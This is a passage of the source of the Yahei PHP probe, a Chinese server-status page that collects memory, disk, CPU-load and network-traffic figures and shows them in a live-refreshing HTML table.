	$res[&#39;memPercent&#39;] &#x3D; round($res[&#39;memUsed&#39;] &#x2F; $res[&#39;memTotal&#39;]*100,2);


	$swapinfo &#x3D; GetWMI($wmi,&quot;Win32_PageFileUsage&quot;, array(&#39;AllocatedBaseSize&#39;,&#39;CurrentUsage&#39;));


	&#x2F;&#x2F; LoadPercentage

	$loadinfo &#x3D; GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;LoadPercentage&quot;));

	$res[&#39;loadAvg&#39;] &#x3D; $loadinfo[0][&#39;LoadPercentage&#39;];


	return $res;

&#125;



function GetWMI($wmi,$strClass, $strValue &#x3D; array())
&#123;

	$arrData &#x3D; array();


	$objWEBM &#x3D; $wmi-&gt;Get($strClass);

	$arrProp &#x3D; $objWEBM-&gt;Properties_;

	$arrWEBMCol &#x3D; $objWEBM-&gt;Instances_();

	foreach($arrWEBMCol as $objItem) 
	&#123;

		@reset($arrProp);

		$arrInstance &#x3D; array();

		foreach($arrProp as $propItem) 
		&#123;

			eval(&quot;\$value &#x3D; \$objItem-&gt;&quot; . $propItem-&gt;Name . &quot;;&quot;);

			if (empty($strValue)) 
			&#123;

				$arrInstance[$propItem-&gt;Name] &#x3D; trim($value);

			&#125; 
			else
			&#123;

				if (in_array($propItem-&gt;Name, $strValue)) 
				&#123;

					$arrInstance[$propItem-&gt;Name] &#x3D; trim($value);

				&#125;

			&#125;

		&#125;

		$arrData[] &#x3D; $arrInstance;

	&#125;

	return $arrData;

&#125;



&#x2F;&#x2F;比例条

function bar($percent)
&#123;

?&gt;

	&lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div class&#x3D;&quot;barli&quot; style&#x3D;&quot;width:&lt;?php echo $percent?&gt;%&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;

&lt;?php

&#125;



$uptime &#x3D; $sysInfo[&#39;uptime&#39;]; &#x2F;&#x2F;在线时间

$stime &#x3D; date(&#39;Y-m-d H:i:s&#39;); &#x2F;&#x2F;系统当前时间

&#x2F;&#x2F;硬盘

$dt &#x3D; round(@disk_total_space(&quot;.&quot;)&#x2F;(1024*1024*1024),3); &#x2F;&#x2F;总
$df &#x3D; round(@disk_free_space(&quot;.&quot;)&#x2F;(1024*1024*1024),3); &#x2F;&#x2F;可用
$du &#x3D; $dt-$df; &#x2F;&#x2F;已用
$hdPercent &#x3D; (floatval($dt)!&#x3D;0)?round($du&#x2F;$dt*100,2):0;

$load &#x3D; $sysInfo[&#39;loadAvg&#39;];	&#x2F;&#x2F;系统负载


&#x2F;&#x2F;判断内存如果小于1G，就显示M，否则显示G单位
if($sysInfo[&#39;memTotal&#39;]&lt;1024)
&#123;
	$memTotal &#x3D; $sysInfo[&#39;memTotal&#39;].&quot; M&quot;;
	$mt &#x3D; $sysInfo[&#39;memTotal&#39;].&quot; M&quot;;
	$mu &#x3D; $sysInfo[&#39;memUsed&#39;].&quot; M&quot;;
	$mf &#x3D; $sysInfo[&#39;memFree&#39;].&quot; M&quot;;
	$mc &#x3D; $sysInfo[&#39;memCached&#39;].&quot; M&quot;;	&#x2F;&#x2F;cache化内存
	$mb &#x3D; $sysInfo[&#39;memBuffers&#39;].&quot; M&quot;;	&#x2F;&#x2F;缓冲
	$st &#x3D; $sysInfo[&#39;swapTotal&#39;].&quot; M&quot;;
	$su &#x3D; $sysInfo[&#39;swapUsed&#39;].&quot; M&quot;;
	$sf &#x3D; $sysInfo[&#39;swapFree&#39;].&quot; M&quot;;
	$swapPercent &#x3D; $sysInfo[&#39;swapPercent&#39;];
	$memRealUsed &#x3D; $sysInfo[&#39;memRealUsed&#39;].&quot; M&quot;; &#x2F;&#x2F;真实内存使用
	$memRealFree &#x3D; $sysInfo[&#39;memRealFree&#39;].&quot; M&quot;; &#x2F;&#x2F;真实内存空闲
	$memRealPercent &#x3D; $sysInfo[&#39;memRealPercent&#39;]; &#x2F;&#x2F;真实内存使用比率
	$memPercent &#x3D; $sysInfo[&#39;memPercent&#39;]; &#x2F;&#x2F;内存总使用率
	$memCachedPercent &#x3D; $sysInfo[&#39;memCachedPercent&#39;]; &#x2F;&#x2F;cache内存使用率
&#125;
else
&#123;
	$memTotal &#x3D; round($sysInfo[&#39;memTotal&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mt &#x3D; round($sysInfo[&#39;memTotal&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mu &#x3D; round($sysInfo[&#39;memUsed&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mf &#x3D; round($sysInfo[&#39;memFree&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mc &#x3D; round($sysInfo[&#39;memCached&#39;]&#x2F;1024,3).&quot; G&quot;;
	$mb &#x3D; round($sysInfo[&#39;memBuffers&#39;]&#x2F;1024,3).&quot; G&quot;;
	$st &#x3D; round($sysInfo[&#39;swapTotal&#39;]&#x2F;1024,3).&quot; G&quot;;
	$su &#x3D; round($sysInfo[&#39;swapUsed&#39;]&#x2F;1024,3).&quot; G&quot;;
	$sf &#x3D; round($sysInfo[&#39;swapFree&#39;]&#x2F;1024,3).&quot; G&quot;;
	$swapPercent &#x3D; $sysInfo[&#39;swapPercent&#39;];
	$memRealUsed &#x3D; round($sysInfo[&#39;memRealUsed&#39;]&#x2F;1024,3).&quot; G&quot;; &#x2F;&#x2F;真实内存使用
	$memRealFree &#x3D; round($sysInfo[&#39;memRealFree&#39;]&#x2F;1024,3).&quot; G&quot;; &#x2F;&#x2F;真实内存空闲
	$memRealPercent &#x3D; $sysInfo[&#39;memRealPercent&#39;]; &#x2F;&#x2F;真实内存使用比率
	$memPercent &#x3D; $sysInfo[&#39;memPercent&#39;]; &#x2F;&#x2F;内存总使用率
	$memCachedPercent &#x3D; $sysInfo[&#39;memCachedPercent&#39;]; &#x2F;&#x2F;cache内存使用率
&#125;


&#x2F;&#x2F;网卡流量

$strs &#x3D; @file(&quot;&#x2F;proc&#x2F;net&#x2F;dev&quot;); 



for ($i &#x3D; 2; $i &lt; count($strs); $i++ )
&#123;
	preg_match_all( &quot;&#x2F;([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)&#x2F;&quot;, $strs[$i], $info );
	$NetOutSpeed[$i] &#x3D; $info[10][0];
	$NetInputSpeed[$i] &#x3D; $info[2][0];
	$NetInput[$i] &#x3D; formatsize($info[2][0]);
	$NetOut[$i]  &#x3D; formatsize($info[10][0]);
&#125;


&#x2F;&#x2F;ajax调用实时刷新

if ($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;rt&quot;)

&#123;

	$arr&#x3D;array(&#39;useSpace&#39;&#x3D;&gt;&quot;$du&quot;,&#39;freeSpace&#39;&#x3D;&gt;&quot;$df&quot;,&#39;hdPercent&#39;&#x3D;&gt;&quot;$hdPercent&quot;,&#39;barhdPercent&#39;&#x3D;&gt;&quot;$hdPercent%&quot;,&#39;TotalMemory&#39;&#x3D;&gt;&quot;$mt&quot;,&#39;UsedMemory&#39;&#x3D;&gt;&quot;$mu&quot;,&#39;FreeMemory&#39;&#x3D;&gt;&quot;$mf&quot;,&#39;CachedMemory&#39;&#x3D;&gt;&quot;$mc&quot;,&#39;Buffers&#39;&#x3D;&gt;&quot;$mb&quot;,&#39;TotalSwap&#39;&#x3D;&gt;&quot;$st&quot;,&#39;swapUsed&#39;&#x3D;&gt;&quot;$su&quot;,&#39;swapFree&#39;&#x3D;&gt;&quot;$sf&quot;,&#39;loadAvg&#39;&#x3D;&gt;&quot;$load&quot;,&#39;uptime&#39;&#x3D;&gt;&quot;$uptime&quot;,&#39;freetime&#39;&#x3D;&gt;&quot;$freetime&quot;,&#39;bjtime&#39;&#x3D;&gt;&quot;$bjtime&quot;,&#39;stime&#39;&#x3D;&gt;&quot;$stime&quot;,&#39;memRealPercent&#39;&#x3D;&gt;&quot;$memRealPercent&quot;,&#39;memRealUsed&#39;&#x3D;&gt;&quot;$memRealUsed&quot;,&#39;memRealFree&#39;&#x3D;&gt;&quot;$memRealFree&quot;,&#39;memPercent&#39;&#x3D;&gt;&quot;$memPercent%&quot;,&#39;memCachedPercent&#39;&#x3D;&gt;&quot;$memCachedPercent&quot;,&#39;barmemCachedPercent&#39;&#x3D;&gt;&quot;$memCachedPercent%&quot;,&#39;swapPercent&#39;&#x3D;&gt;&quot;$swapPercent&quot;,&#39;barmemRealPercent&#39;&#x3D;&gt;&quot;$memRealPercent%&quot;,&#39;barswapPercent&#39;&#x3D;&gt;&quot;$swapPercent%&quot;,&#39;NetOut2&#39;&#x3D;&gt;&quot;$NetOut[2]&quot;,&#39;NetOut3&#39;&#x3D;&gt;&quot;$NetOut[3]&quot;,&#39;NetOut4&#39;&#x3D;&gt;&quot;$NetOut[4]&quot;,&#39;NetOut5&#39;&#x3D;&gt;&quot;$NetOut[5]&quot;,&#39;NetOut6&#39;&#x3D;&gt;&quot;$NetOut[6]&quot;,&#39;NetOut7&#39;&#x3D;&gt;&quot;$NetOut[7]&quot;,&#39;NetOut8&#39;&#x3D;&gt;&quot;$NetOut[8]&quot;,&#39;NetOut9&#39;&#x3D;&gt;&quot;$NetOut[9]&quot;,&#39;NetOut10&#39;&#x3D;&gt;&quot;$NetOut[10]&quot;,&#39;NetInput2&#39;&#x3D;&gt;&quot;$NetInput[2]&quot;,&#39;NetInput3&#39;&#x3D;&gt;&quot;$NetInput[3]&quot;,&#39;NetInput4&#39;&#x3D;&gt;&quot;$NetInput[4]&quot;,&#39;NetInput5&#39;&#x3D;&gt;&quot;$NetInput[5]&quot;,&#39;NetInput6&#39;&#x3D;&gt;&quot;$NetInput[6]&quot;,&#39;NetInput7&#39;&#x3D;&gt;&quot;$NetInput[7]&quot;,&#39;NetInput8&#39;&#x3D;&gt;&quot;$NetInput[8]&quot;,&#39;NetInput9&#39;&#x3D;&gt;&quot;$NetInput[9]&quot;,&#39;NetInput10&#39;&#x3D;&gt;&quot;$NetInput[10]&quot;,&#39;NetOutSpeed2&#39;&#x3D;&gt;&quot;$NetOutSpeed[2]&quot;,&#39;NetOutSpeed3&#39;&#x3D;&gt;&quot;$NetOutSpeed[3]&quot;,&#39;NetOutSpeed4&#39;&#x3D;&gt;&quot;$NetOutSpeed[4]&quot;,&#39;NetOutSpeed5&#39;&#x3D;&gt;&quot;$NetOutSpeed[5]&quot;,&#39;NetInputSpeed2&#39;&#x3D;&gt;&quot;$NetInputSpeed[2]&quot;,&#39;NetInputSpeed3&#39;&#x3D;&gt;&quot;$NetInputSpeed[3]&quot;,&#39;NetInputSpeed4&#39;&#x3D;&gt;&quot;$NetInputSpeed[4]&quot;,&#39;NetInputSpeed5&#39;&#x3D;&gt;&quot;$NetInputSpeed[5]&quot;);

	$jarr&#x3D;json_encode($arr); 
	$_GET[&#39;callback&#39;] &#x3D; htmlspecialchars($_GET[&#39;callback&#39;]);

	echo $_GET[&#39;callback&#39;],&#39;(&#39;,$jarr,&#39;)&#39;;

	exit;

&#125;

?&gt;

&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;

&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;

&lt;head&gt;
&lt;title&gt;&lt;?php echo $title.$version; ?&gt;&lt;&#x2F;title&gt;
&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;EmulateIE7&quot; &#x2F;&gt;

&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;
&lt;!-- Powered by: Yahei.Net --&gt;

&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;
&lt;!--
* &#123;font-family: &quot;Microsoft Yahei&quot;,Tahoma, Arial; &#125;
body&#123;text-align: center; margin: 0 auto; padding: 0; background-color:#fafafa;font-size:12px;font-family:Tahoma, Arial&#125;
h1 &#123;font-size: 26px; padding: 0; margin: 0; color: #333333; font-family: &quot;Lucida Sans Unicode&quot;,&quot;Lucida Grande&quot;,sans-serif;&#125;
h1 small &#123;font-size: 11px; font-family: Tahoma; font-weight: bold; &#125;
a&#123;color: #666; text-decoration:none;&#125;
a.black&#123;color: #000000; text-decoration:none;&#125;
table&#123;width:100%;clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;
box-shadow: 1px 1px 1px #CCC;
-moz-box-shadow: 1px 1px 1px #CCC;
-webkit-box-shadow: 1px 1px 1px #CCC;
-ms-filter: &quot;progid:DXImageTransform.Microsoft.Shadow(Strength&#x3D;2, Direction&#x3D;135, Color&#x3D;&#39;#CCCCCC&#39;)&quot;;&#125;
th&#123;padding: 3px 6px; font-weight:bold;background:#dedede;color:#626262;border:1px solid #cccccc; text-align:left;&#125;
tr&#123;padding: 0; background:#FFFFFF;&#125;
td&#123;padding: 3px 6px; border:1px solid #CCCCCC;&#125;
.w_logo&#123;height:25px;text-align:center;color:#333;FONT-SIZE: 15px; width:13%; &#125;
.w_top&#123;height:25px;text-align:center; width:8.7%;&#125;
.w_top:hover&#123;background:#dadada;&#125;
.w_foot&#123;height:25px;text-align:center; background:#dedede;&#125;
input&#123;padding: 2px; background: #FFFFFF; border-top:1px solid #666666; border-left:1px solid #666666; border-right:1px solid #CCCCCC; border-bottom:1px solid #CCCCCC; font-size:12px&#125;
input.btn&#123;font-weight: bold; height: 20px; line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:12px&#125;
.bar &#123;border:1px solid #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.bar_1 &#123;border:1px dotted #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.barli_red&#123;background:#ff6600; height:5px; margin:0px; padding:0;&#125;
.barli_blue&#123;background:#0099FF; height:5px; margin:0px; padding:0;&#125;
.barli_green&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
.barli_black&#123;background:#333; height:5px; margin:0px; padding:0;&#125;
.barli_1&#123;background:#999999; height:5px; margin:0px; padding:0;&#125;
.barli&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
#page &#123;width: 960px; padding: 0 auto; margin: 0 auto; text-align: left;&#125;
#header&#123;position:relative; padding:5px;&#125;
.w_small&#123;font-family: Courier New;&#125;
.w_number&#123;color: #f800fe;&#125;
.sudu &#123;padding: 0; background:#5dafd1; &#125;
.suduk &#123; margin:0px; padding:0;&#125;
.resYes&#123;&#125;
.resNo&#123;color: #FF0000;&#125;
.word&#123;word-break:break-all;&#125;
--&gt;
&lt;&#x2F;style&gt;

&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;lib.sinaapp.com&#x2F;js&#x2F;jquery&#x2F;1.7&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;

&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; 

&lt;!--

$(document).ready(function()&#123;getJSONData();&#125;);
var OutSpeed2&#x3D;&lt;?php echo floor($NetOutSpeed[2]) ?&gt;;
var OutSpeed3&#x3D;&lt;?php echo floor($NetOutSpeed[3]) ?&gt;;
var OutSpeed4&#x3D;&lt;?php echo floor($NetOutSpeed[4]) ?&gt;;
var OutSpeed5&#x3D;&lt;?php echo floor($NetOutSpeed[5]) ?&gt;;
var InputSpeed2&#x3D;&lt;?php echo floor($NetInputSpeed[2]) ?&gt;;
var InputSpeed3&#x3D;&lt;?php echo floor($NetInputSpeed[3]) ?&gt;;
var InputSpeed4&#x3D;&lt;?php echo floor($NetInputSpeed[4]) ?&gt;;
var InputSpeed5&#x3D;&lt;?php echo floor($NetInputSpeed[5]) ?&gt;;

function getJSONData()

&#123;

	setTimeout(&quot;getJSONData()&quot;, 1000);

	$.getJSON(&#39;?act&#x3D;rt&amp;callback&#x3D;?&#39;, displayData);

&#125;
function ForDight(Dight,How)
&#123; 
  if (Dight&lt;0)&#123;
  	var Last&#x3D;0+&quot;B&#x2F;s&quot;;
  &#125;else if (Dight&lt;1024)&#123;
  	var Last&#x3D;Math.round(Dight*Math.pow(10,How))&#x2F;Math.pow(10,How)+&quot;B&#x2F;s&quot;;
  &#125;else if (Dight&lt;1048576)&#123;
  	Dight&#x3D;Dight&#x2F;1024;
  	var Last&#x3D;Math.round(Dight*Math.pow(10,How))&#x2F;Math.pow(10,How)+&quot;K&#x2F;s&quot;;
  &#125;else&#123;
  	Dight&#x3D;Dight&#x2F;1048576;
  	var Last&#x3D;Math.round(Dight*Math.pow(10,How))&#x2F;Math.pow(10,How)+&quot;M&#x2F;s&quot;;
  &#125;
	return Last; 
&#125;

function displayData(dataJSON)

&#123;
	$(&quot;#useSpace&quot;).html(dataJSON.useSpace);

	$(&quot;#freeSpace&quot;).html(dataJSON.freeSpace);
	$(&quot;#hdPercent&quot;).html(dataJSON.hdPercent);
	$(&quot;#barhdPercent&quot;).width(dataJSON.barhdPercent);

	$(&quot;#TotalMemory&quot;).html(dataJSON.TotalMemory);

	$(&quot;#UsedMemory&quot;).html(dataJSON.UsedMemory);

	$(&quot;#FreeMemory&quot;).html(dataJSON.FreeMemory);

	$(&quot;#CachedMemory&quot;).html(dataJSON.CachedMemory);
	$(&quot;#Buffers&quot;).html(dataJSON.Buffers);

	$(&quot;#TotalSwap&quot;).html(dataJSON.TotalSwap);

	$(&quot;#swapUsed&quot;).html(dataJSON.swapUsed);

	$(&quot;#swapFree&quot;).html(dataJSON.swapFree);

	$(&quot;#swapPercent&quot;).html(dataJSON.swapPercent);

	$(&quot;#loadAvg&quot;).html(dataJSON.loadAvg);

	$(&quot;#uptime&quot;).html(dataJSON.uptime);

	$(&quot;#freetime&quot;).html(dataJSON.freetime);

	$(&quot;#stime&quot;).html(dataJSON.stime);

	$(&quot;#bjtime&quot;).html(dataJSON.bjtime);

	$(&quot;#memRealUsed&quot;).html(dataJSON.memRealUsed);
	$(&quot;#memRealFree&quot;).html(dataJSON.memRealFree);
	$(&quot;#memRealPercent&quot;).html(dataJSON.memRealPercent);

	$(&quot;#memPercent&quot;).html(dataJSON.memPercent);
	$(&quot;#barmemPercent&quot;).width(dataJSON.memPercent);

	$(&quot;#barmemRealPercent&quot;).width(dataJSON.barmemRealPercent);
	$(&quot;#memCachedPercent&quot;).html(dataJSON.memCachedPercent);
	$(&quot;#barmemCachedPercent&quot;).width(dataJSON.barmemCachedPercent);

	$(&quot;#barswapPercent&quot;).width(dataJSON.barswapPercent);

	$(&quot;#NetOut2&quot;).html(dataJSON.NetOut2);

	$(&quot;#NetOut3&quot;).html(dataJSON.NetOut3);

	$(&quot;#NetOut4&quot;).html(dataJSON.NetOut4);

	$(&quot;#NetOut5&quot;).html(dataJSON.NetOut5);

	$(&quot;#NetOut6&quot;).html(dataJSON.NetOut6);

	$(&quot;#NetOut7&quot;).html(dataJSON.NetOut7);

	$(&quot;#NetOut8&quot;).html(dataJSON.NetOut8);

	$(&quot;#NetOut9&quot;).html(dataJSON.NetOut9);

	$(&quot;#NetOut10&quot;).html(dataJSON.NetOut10);
	$(&quot;#NetInput2&quot;).html(dataJSON.NetInput2);
	$(&quot;#NetInput3&quot;).html(dataJSON.NetInput3);
	$(&quot;#NetInput4&quot;).html(dataJSON.NetInput4);
	$(&quot;#NetInput5&quot;).html(dataJSON.NetInput5);
	$(&quot;#NetInput6&quot;).html(dataJSON.NetInput6);
	$(&quot;#NetInput7&quot;).html(dataJSON.NetInput7);
	$(&quot;#NetInput8&quot;).html(dataJSON.NetInput8);
	$(&quot;#NetInput9&quot;).html(dataJSON.NetInput9);
	$(&quot;#NetInput10&quot;).html(dataJSON.NetInput10);	
	$(&quot;#NetOutSpeed2&quot;).html(ForDight((dataJSON.NetOutSpeed2-OutSpeed2),3));	OutSpeed2&#x3D;dataJSON.NetOutSpeed2;
	$(&quot;#NetOutSpeed3&quot;).html(ForDight((dataJSON.NetOutSpeed3-OutSpeed3),3));	OutSpeed3&#x3D;dataJSON.NetOutSpeed3;
	$(&quot;#NetOutSpeed4&quot;).html(ForDight((dataJSON.NetOutSpeed4-OutSpeed4),3));	OutSpeed4&#x3D;dataJSON.NetOutSpeed4;
	$(&quot;#NetOutSpeed5&quot;).html(ForDight((dataJSON.NetOutSpeed5-OutSpeed5),3));	OutSpeed5&#x3D;dataJSON.NetOutSpeed5;
	$(&quot;#NetInputSpeed2&quot;).html(ForDight((dataJSON.NetInputSpeed2-InputSpeed2),3));	InputSpeed2&#x3D;dataJSON.NetInputSpeed2;
	$(&quot;#NetInputSpeed3&quot;).html(ForDight((dataJSON.NetInputSpeed3-InputSpeed3),3));	InputSpeed3&#x3D;dataJSON.NetInputSpeed3;
	$(&quot;#NetInputSpeed4&quot;).html(ForDight((dataJSON.NetInputSpeed4-InputSpeed4),3));	InputSpeed4&#x3D;dataJSON.NetInputSpeed4;
	$(&quot;#NetInputSpeed5&quot;).html(ForDight((dataJSON.NetInputSpeed5-InputSpeed5),3));	InputSpeed5&#x3D;dataJSON.NetInputSpeed5;

&#125;

--&gt;

&lt;&#x2F;script&gt;

&lt;&#x2F;head&gt;

&lt;body&gt;
&lt;a name&#x3D;&quot;w_top&quot;&gt;&lt;&#x2F;a&gt;

&lt;div id&#x3D;&quot;page&quot;&gt;

	
	&lt;table&gt;
		&lt;tr&gt;
			&lt;th class&#x3D;&quot;w_logo&quot;&gt;雅黑PHP探针&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_php&quot;&gt;PHP参数&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_module&quot;&gt;组件支持&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_module_other&quot;&gt;第三方组件&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_db&quot;&gt;数据库支持&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_performance&quot;&gt;性能检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_networkspeed&quot;&gt;网速检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_MySQL&quot;&gt;MySQL检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_function&quot;&gt;函数检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;#w_mail&quot;&gt;邮件检测&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
			&lt;th class&#x3D;&quot;w_top&quot;&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.yahei.net&#x2F;tz&#x2F;tz.zip&quot;&gt;探针下载&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;
		&lt;&#x2F;tr&gt;
	&lt;&#x2F;table&gt;



&lt;!--服务器相关参数--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot;&gt;服务器参数&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器域名&#x2F;IP地址&lt;&#x2F;td&gt;

    &lt;td colspan&#x3D;&quot;3&quot;&gt;&lt;?php echo @get_current_user();?&gt; - &lt;?php echo $_SERVER[&#39;SERVER_NAME&#39;];?&gt;(&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR)&#123;echo $_SERVER[&#39;SERVER_ADDR&#39;];&#125;else&#123;echo @gethostbyname($_SERVER[&#39;SERVER_NAME&#39;]);&#125; ?&gt;)&amp;nbsp;&amp;nbsp;你的IP地址是：&lt;?php echo @$_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器标识&lt;&#x2F;td&gt;

    &lt;td colspan&#x3D;&quot;3&quot;&gt;&lt;?php if($sysInfo[&#39;win_n&#39;] !&#x3D; &#39;&#39;)&#123;echo $sysInfo[&#39;win_n&#39;];&#125;else&#123;echo @php_uname();&#125;;?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;13%&quot;&gt;服务器操作系统&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot;&gt;&lt;?php $os &#x3D; explode(&quot; &quot;, php_uname()); echo $os[0];?&gt; &amp;nbsp;内核版本：&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR)&#123;echo $os[2];&#125;else&#123;echo $os[1];&#125; ?&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;13%&quot;&gt;服务器解译引擎&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot;&gt;&lt;?php echo $_SERVER[&#39;SERVER_SOFTWARE&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器语言&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo getenv(&quot;HTTP_ACCEPT_LANGUAGE&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;服务器端口&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $_SERVER[&#39;SERVER_PORT&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;服务器主机名&lt;&#x2F;td&gt;

	  &lt;td&gt;&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR )&#123;echo $os[1];&#125;else&#123;echo $os[2];&#125; ?&gt;&lt;&#x2F;td&gt;

	  &lt;td&gt;绝对路径&lt;&#x2F;td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER[&#39;DOCUMENT_ROOT&#39;]?str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$_SERVER[&#39;DOCUMENT_ROOT&#39;]):str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,dirname(__FILE__));?&gt;&lt;&#x2F;td&gt;

	&lt;&#x2F;tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;管理员邮箱&lt;&#x2F;td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER[&#39;SERVER_ADMIN&#39;];?&gt;&lt;&#x2F;td&gt;

		&lt;td&gt;探针路径&lt;&#x2F;td&gt;

		&lt;td&gt;&lt;?php echo str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,__FILE__)?str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,__FILE__):$_SERVER[&#39;SCRIPT_FILENAME&#39;];?&gt;&lt;&#x2F;td&gt;

	&lt;&#x2F;tr&gt;	

&lt;&#x2F;table&gt;



&lt;?if(&quot;show&quot;&#x3D;&#x3D;$sysReShow)&#123;?&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;6&quot;&gt;服务器实时数据&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;13%&quot; &gt;服务器当前时间&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot; &gt;&lt;span id&#x3D;&quot;stime&quot;&gt;&lt;?php echo $stime;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;13%&quot; &gt;服务器已运行时间&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;37%&quot; colspan&#x3D;&quot;3&quot;&gt;&lt;span id&#x3D;&quot;uptime&quot;&gt;&lt;?php echo $uptime;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;

    &lt;td width&#x3D;&quot;13%&quot;&gt;CPU型号 [&lt;?php echo $sysInfo[&#39;cpu&#39;][&#39;num&#39;];?&gt;核]&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;87%&quot; colspan&#x3D;&quot;5&quot;&gt;&lt;?php echo $sysInfo[&#39;cpu&#39;][&#39;model&#39;];?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CPU使用状况&lt;&#x2F;td&gt;
